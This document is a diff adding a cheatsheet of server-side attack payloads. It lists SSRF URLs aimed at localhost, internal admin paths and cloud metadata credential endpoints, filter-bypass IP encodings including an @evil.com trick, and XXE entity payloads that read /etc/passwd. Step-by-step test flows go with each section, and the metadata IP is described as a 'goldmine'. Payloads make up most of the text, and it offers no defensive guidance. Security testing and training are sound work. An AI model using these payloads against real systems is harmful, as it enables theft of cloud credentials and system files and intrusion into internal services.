@@ -1,0 +1,162 @@
+========================================
+SERVER-SIDE ATTACKS CHEATSHEET
+(SSRF + XXE)
+========================================
+
+[HOW TO IDENTIFY]
+- App fetches URL for you
+- Features like:
+  - image URL upload
+  - webhook / callback
+  - URL preview
+  - API fetch
+
+========================================
+🌍 SSRF (SERVER-SIDE REQUEST FORGERY)
+========================================
+
+[WHAT]
+- Server makes request on your behalf
+- You control the URL
+
+----------------------------------------
+🔥 BASIC PAYLOADS
+----------------------------------------
+
+http://127.0.0.1
+http://localhost
+http://0.0.0.0
+
+----------------------------------------
+🔍 INTERNAL TARGETS
+----------------------------------------
+
+http://127.0.0.1/admin
+http://localhost/admin
+http://127.0.0.1:80
+http://127.0.0.1:8080
+
+----------------------------------------
+☁️ CLOUD METADATA (VERY IMPORTANT)
+----------------------------------------
+
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+----------------------------------------
+🔓 BYPASS FILTERS
+----------------------------------------
+
+[Different IP formats]
+http://127.1
+http://2130706433   (decimal)
+http://0x7f000001   (hex)
+
+[With @]
+http://127.0.0.1@evil.com
+
+[Using localhost variations]
+http://localhost
+http://localhost.localdomain
+
+----------------------------------------
+🧪 TEST FLOW
+----------------------------------------
+
+1. Find URL input field
+2. Enter:
+   http://127.0.0.1
+3. Try:
+   /admin
+4. Try:
+   169.254.169.254
+5. If blocked → try bypass
+
+========================================
+📄 XXE (XML EXTERNAL ENTITY)
+========================================
+
+[HOW TO IDENTIFY]
+- XML input
+- Content-Type: application/xml
+
+----------------------------------------
+🔥 BASIC PAYLOAD
+----------------------------------------
+
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<foo>&xxe;</foo>
+
+----------------------------------------
+📂 READ FILES
+----------------------------------------
+
+file:///etc/passwd
+file:///etc/hosts
+
+----------------------------------------
+🌍 SSRF VIA XXE
+----------------------------------------
+
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://127.0.0.1"> ]>
+<foo>&xxe;</foo>
+
+----------------------------------------
+🔓 BYPASS FILTERS
+----------------------------------------
+
+[Different encodings]
+file:///etc/passwd
+
+[Parameter entity]
+<!ENTITY % xxe SYSTEM "file:///etc/passwd">
+
+----------------------------------------
+🧪 TEST FLOW
+----------------------------------------
+
+1. Send XML request
+2. Inject DOCTYPE
+3. Try reading:
+   /etc/passwd
+4. Check response
+
+========================================
+🔍 COMMON ENTRY POINTS
+========================================
+
+- File upload (XML)
+- API endpoints
+- SOAP services
+- RSS feeds
+
+========================================
+🔥 QUICK PAYLOAD SET
+========================================
+
+http://127.0.0.1
+http://localhost/admin
+http://169.254.169.254
+
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<foo>&xxe;</foo>
+
+========================================
+⚠️ COMMON MISTAKES
+========================================
+
+- Not trying localhost
+- Ignoring metadata IP
+- Forgetting XML format
+- Not trying bypass
+
+========================================
+RULES
+========================================
+
+- URL INPUT = SSRF
+- XML INPUT = XXE
+- ALWAYS TRY 127.0.0.1
+- METADATA IP = GOLDMINE
+
+========================================
